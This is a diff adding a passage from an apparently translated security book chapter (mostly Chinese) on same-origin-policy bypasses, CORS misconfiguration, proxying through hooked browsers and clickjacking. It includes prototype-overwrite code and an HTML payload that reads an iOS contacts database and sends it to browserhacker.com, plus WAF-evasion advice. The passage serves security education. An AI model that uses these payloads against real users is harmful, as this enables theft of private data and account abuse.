@@ -1,0 +1,186 @@
+
+- [框架代码](https://browserhacker.com)正在向控制台打印 `[].constructor.prototype.join` 的值，这是调用 `join()` 方法时数组使用的原生代码。5 秒后，`join()` 方法会在 `[1,2,3]` 数组上被调用，之前使用的打印函数会再次被调用。第二次输出显示了原型被覆盖后的差异。如果回顾第一个代码片段，可以看到 `join()` 原型在 `do_something()` 函数内部被覆盖。
+
+```
+iframe.contentWindow.location.constructor.
+prototype.__defineGetter__.constructor('[].constructor.
+prototype.join=function(){console.log("pwned")}')();
+```
+
+请注意，可以在不触发 SOP 违规错误的情况下调用 `iframe.contentWindow.location.constructor`。这是一种错误行为，因为 SOP 应该被强制执行。例如，Chrome 会抛出 SOP 违规错误，如 Figure 4-4 所示。
+
+**Figure 4-4:** Chrome SOP 违规错误，当尝试访问构造函数时
+
+![c04f004.tif](img/c04f004.png)
+
+进一步来说，你想验证在原型覆盖后是否可以执行代码。在 Figure 4-5 中，你可以看到可以执行代码，例如 `return 5+20`，但可用的操作受限。即使 `alert()` 函数也无法使用，会产生安全错误。
+
+**Figure 4-5:** 尝试执行受限操作时的安全错误
+
+![c04f005.tif](img/c04f005.png)
+
+Heyes 还发现了通过覆盖字面量来绕过 SOP 的方法，这些方法未被 Opera 过滤。使用 `[]` 的数组字面量，并对 `join()` 方法进行原型覆盖，即可在框架内容每次调用数组的 `join()` 方法时执行任意代码：
+
+```
+[].constructor.prototype.join=function(){your_code};
+```
+
+为了演示 SOP 绕过的效果，从 [`browserhacker.com`](https://browserhacker.com) 获取代码，然后在两个不同来源上托管这两个代码片段，并在 Opera 12.02 控制台中打开。控制台输出将与 Figure 4-6 相同。
+
+**Figure 4-6:** 在 Opera 中覆盖 `join()` 函数
+
+![c04f006.tif](img/c04f006.png)
+
+使用此绕过的前提是：只能针对可框架的网站。因此，使用 `X-Frame-Options` 或防止框架的源不在该 SOP 绕过的范围内。另一个需要提及的考虑因素是，你可以使用字面量覆盖任何原型，而不仅仅是 `Array.join()` 方法。例如，你可以覆盖 `toString()` 方法：
+
+```
+"".constructor.prototype.toString=function(){alert(1)}
+```
+
+在真实攻击中，你可能会框架一个资源，可能是已存储会话 cookie 的已认证资源，并使用此 SOP 绕过来读取框架资源的内容。框架资源通常包含用户的私有数据，因为有效的会话 cookie 在加载资源时已被使用。
+
+考虑一种情况：目标浏览器在 Opera 中有两个打开的标签页：一个是你控制的钩选标签页，另一个是目标的已认证源。如果你在钩选标签页中创建一个以已认证源为 `src` 的 IFrame，你就可以读取 IFrame 的内容。这意味着你可以访问目标已认证源中的任何敏感信息。
+
+这种攻击的结果是读取跨源资源的内容，从而有效绕过 SOP。
+
+# 绕过 SOP 在云存储中的应用
+
+SOP 强制执行的问题不仅仅局限于浏览器和插件。2012 年，多个云存储服务也被发现存在 SOP 绕过弱点，包括 iOS 上的 Dropbox 1.4.6 和 2.0.1，Android 上的 Dropbox 2.0.1，以及 iOS 上的 Google Drive 1.0.1。这些服务允许本地文件存储和同步到云端，以便在其他安装了 Dropbox 或 Google Drive 客户端的设备上随时访问。
+
+Roi Saltzman 发现了一个类似于前文提到的 Safari SOP 绕过的漏洞，该漏洞影响了 Dropbox 和 Google Drive。该攻击依赖于加载在特权区域的文件，例如：
+
+```
+file:///var/mobile/Applications/APP_UUID
+```
+
+如果你能骗人通过客户端加载一个 HTML 文件，其中包含的 JavaScript 代码将被执行。由于文件加载在特权区域，JavaScript 可以访问移动设备的本地文件系统。需要注意的是，强制执行 SOP 的设计本身就有缺陷。因为恶意 HTML 文件是通过 `file` 方案加载的，JavaScript 可以访问其他文件，例如：
+
+```
+file:///var/mobile/Library/AddressBook/AddressBook.sqlitedb
+```
+
+这份 SQLite 数据库包含 iOS 用户的通讯录。当然，该文件必须是应用程序可以访问的。如果目标应用程序拒绝在其范围之外访问文件，你仍然可以检索缓存文件等。这种漏洞导致的访问很大程度上取决于受影响的应用程序。
+
+如果你骗人让目标使用受影响的 Dropbox 或 Google Drive 客户端打开以下恶意文件，用户的通讯录内容将被发送到 browserhacker.com：
+
+```
+<html>
+<body>
+<script>
+ local_xhr = new XMLHttpRequest();
+ local_xhr.open("GET", "file:///var/mobile/Library/AddressBook/
+ AddressBook.sqlitedb");
+ local_xhr.send();
+ 
+ local_xhr.onreadystatechange = function () {
+  if (local_xhr.readyState == 4) {
+   remote_xhr = new XMLHttpRequest();
+   remote_xhr.onreadystatechange = function () {};
+   remote_xhr.open("GET", "http://browserhacker.com/?f=" +
+   encodeURI(local_xhr.responseText));
+   remote_xhr.send();
+  }
+ }
+</script>
+</body>
+</html>
+```
+
+这段攻击演示了通过精心放置的 JavaScript 在不同环境和上下文中运行的多种利用方法。JavaScript 不仅在网页浏览器中运行，还可能在其他环境中运行。在 iOS 攻击的例子中，该 exploit 在 Dropbox 或 Google 应用中的 `UIWebView` 对象内运行。`UIWebView` 对象通常作为嵌入式浏览器窗口在原生 iOS 应用中使用。
+
+另一个值得注意的点是，该攻击针对移动操作系统，而非传统桌面环境。由于可见 UI 的大小限制，这类任务往往在目标甚至没有意识到的情况下进行。
+
+# 绕过 SOP 在 CORS 中
+
+虽然跨来源资源共享（CORS）是放宽 SOP 的好方法，但如果不充分理解放宽策略的安全影响，很容易配置错误。以下是一个潜在的误配置示例：
+
+```
+Access-Control-Allow-Origin: *
+```
+
+2012 年 11 月，Veracode 进行研究，分析了 Alexa 前一百万个网站的 HTTP 头部。24 个唯一的来源返回了 `Access-Control-Allow-Origin` 头的通配符值。这实际上允许 Internet 上的任何其他网站向这些网站提交跨源请求并读取响应。实践中，这意味着攻击者拥有等同于 SOP 绕过的所有这些域的功能。根据 Web 应用功能的不同，这种配置的结果可能是灾难性的。从一个不同来源的钩选浏览器中，这些来源可以以比 SOP 强制的情况更可靠的方式被爬取和攻击。
+
+显然，在 `Access-Control-Allow-Origin` 设置为通配符值时可能并不存在安全隐患。例如，如果仅使用宽松策略来提供不包含敏感信息的内容。
+
+在分析设置 CORS 头部的应用程序时，始终要理解允许的源之间的关系。即使未使用通配符值，也可能会有多个源被允许连接到同一目标。因此，针对这些允许的源的标准 XSS 漏洞可能足以让你跨源利用目标功能。
+
+所有这些 SOP 绕过示例仅作为概念性说明——它们并非穷尽列表。其他向量可能在此处描述，而且许多其他的仍在等待公开。我们鼓励您思考不同种类之间的关系，以及它们共同依赖的共同点。依赖 301 或 302 重定向以及 `file` 等方案的 SOP 绕过在未来发现的新 SOP 执行漏洞中几乎肯定会非常常见。
+
+# Exploiting SOP Bypasses
+
+现在，您已经对 SOP 有了良好的理解，并且掌握了多个 SOP 绕过的示例，接下来是时候来看看一些实际攻击了。
+
+您将学习如何利用前几页介绍的某些 SOP 绕过方法，使用挂钩浏览器作为 HTTP 代理。即使面对诸如防御性 Cookie 标志和并发会话防止等众多 Web 应用安全控制，这也可以实现。本节还将介绍多种 UI 重置攻击。其中一些依赖于 SOP 绕过，另外一些则是因为 SOP 最初并未设计来应对这些问题。
+
+## Proxying Requests
+
+一旦您掌握了对某个源的控制权，更高级的攻击就能够实施。通过利用挂钩浏览器代表您发出请求，您可以有效地通过挂钩浏览器代理请求，并使用它浏览其他源。这带来了若干好处，包括使用挂钩用户的 Cookie（身份验证令牌）进行浏览，这能够提供广泛的额外访问权限。当然，即使没有 SOP 绕过，代理请求也能够为您带来极大价值。
+
+Anton Rager 发布了首篇公开的研究论文，阐述如何利用 XSS 漏洞创建 HTTP 代理。25 Petko Petkov 随后在此基础上扩展了 Rager 的工作，开发出 BackFrame。2006 年，Stefano di Paola 和 Giorgio Fedon 又在论文“Subverting AJAX”中进一步延伸了这一研究，他们展示了利用原型覆盖、HTTP 响应拆分等技术对 AJAX 进行劫持的多种方式。
+
+其他利用挂钩浏览器作为 HTTP 代理的研究还包括 Ferruh Mavituna 于 2007 年发布的 XSS Tunnel27。该概念随后被纳入 BeEF，演变为 Tunneling Proxy。此后，BeEF 的 Tunneling Proxy 进一步扩展，以支持利用其他 SOP 绕过方法。代理请求的核心思路如下：
+
+1. 服务器套接字在攻击机器（代理后端）上监听。它解析传入的 HTTP 请求，并将其转换为 AJAX 请求，准备作为额外的 JavaScript 代码注入到挂钩浏览器中。
+2. 这些 JavaScript 片段随后通过第 3 章中探讨的通信通道之一发送到挂钩浏览器。
+3. 当挂钩浏览器执行这些额外代码时，相应的 AJAX 请求会被发出，HTTP 响应随即返回到代理后端。
+4. 代理后端会剥除并调整各种头部（如 Gzip、`Content-Length` 等），然后将响应发送回最初向代理发送 HTTP 请求的客户端套接字。
+
+这些步骤已在 Figure 4-7 中复现，图中展示了如何通过挂钩浏览器隧道传输请求。
+
+**Figure 4-7:** Tunneling Proxy 高层架构
+
+![c04f007.eps](img/c04f007.png)
+
+在隧道传输请求时，默认情况下您仅限于与挂钩站点同源的请求，因为 SOP 防止跨源访问。例如，若挂钩了 browservictim.com 的用户，您只能请求该源内的页面。这是因为 SOP 阻止您跨越该源。
+
+然而，一旦拥有 SOP 绕过方法，您就能够代理超出该源的请求，从而使用挂钩浏览器的授权（Cookie 会话令牌）访问任意页面。
+
+考虑一种场景（无 SOP 绕过）：您想攻击一个面向公众的 Web 应用。可能存在 Web Application Firewall（WAF），配置为在五次恶意请求后严格阻止攻击源 IP。您刚刚发现一种 DOM‑based XSS，这种漏洞无法通过传统 WAF 进行防御，并且您已成功挂钩到公司内部网络中的一位用户。WAF 通常会在规则集中白名单公司网关地址和网段，因为内部网络被视为攻击概率极低的来源。
+
+您现在可以利用 Tunneling Proxy 检查该 Web 应用的更多漏洞。请求通过挂钩浏览器（位于内部网络）进行隧道传输，因而不会在 WAF 上产生过多噪声，理想情况下会被完全忽略，因为请求来源被视为可信的内部网络。正如第 9 章“通过浏览器代理”所探讨的，您甚至可以通过 Tunneling Proxy 使用 `Burp` 和 `sqlmap`。
+
+另一种使用 Tunneling Proxy 的原因是当目标源需要身份验证时。想象您已通过 XSS 在身份验证后获取了挂钩浏览器，您可以利用 Tunneling Proxy 轻松浏览已验证的应用界面，实际上借助挂钩目标的会话进行访问。您无需窃取 Cookie。值得注意的是，`HttpOnly` 安全控制在此情形下无效，因为是目标浏览器本身在为您请求资源。
+
+如果将 Tunneling Proxy 与 SOP 绕过相结合，您便拥有了开放的 HTTP 代理。这是因为受影响的挂钩浏览器能够发送跨源请求并读取所有源的响应。事实上，如果您有多个受相同 SOP 绕过影响的挂钩浏览器，则可以获得多个代理。您可以根据各挂钩浏览器的网络带宽进行切换，或利用多个挂钩浏览器同时发起同源请求，从多个位置交付攻击。
+
+## Exploiting UI Redressing Attacks
+
+UI 重置攻击在浏览器和应用安全场景中日益突出。随着社交网络的兴起、广告和“点赞”按钮的普及，这种攻击已开始在野外被利用。28
+
+最为人知的 UI 重置攻击类型是 Clickjacking。显然，还有其他可归类为 UI 重置的攻击，它们在可执行的操作和可获取的信息方面存在差异。下面的章节将对这些攻击进行分析，并回顾一些依赖于拖放操作的历史攻击。
+
+### Using Clickjacking
+
+Clickjacking 攻击利用独立定位的透明 IFrames 与特殊 CSS 选择器欺骗用户点击不可见的元素。该攻击最早在 2002 年由 Jesse Ruderman 讨论，随后于 2008 年由 Robert Hansen 和 Jeremiah Grossman 命名为 Clickjacking。下面是一个示例，其中包含行政功能的页面通过 IFrame 嵌入到另一页面：
+
+```
+<html>
+
+<head>
+
+</head>
+
+<body>
+
+  <form name="addUserToAdmins" action="javascript:alert('clicked on hidden IFrame. User added.')" method="POST">
+
+    <input type="hidden" name="userId" value"1234">
+
+    <input type="hidden" name="isAdmin" value"true">
+
+    <input type="hidden" name="token" value"asasdasd86a
+
+sd876as87623234aksjdhjkashd">
+
+    <input type="submit" value="Add to admin group" 
+
+    style="height: 60px; width: 150px; font-size:3em">
+
+  </form>
+
+</body>
+
+</html>
+```
+
+The page also uses anti-XSRF tokens to prevent Cross-site Request Forgery attacks. For the sake of the demonstration, the `action` attribute of the HTML form contains JavaScript that displays an Alert box. A real page would contain a proper URL where those input values are sent. When the user clicks the Submit button, the user with ID 1234 is added to the administrative group. To launch the attack, the previous page is framed in the following page:
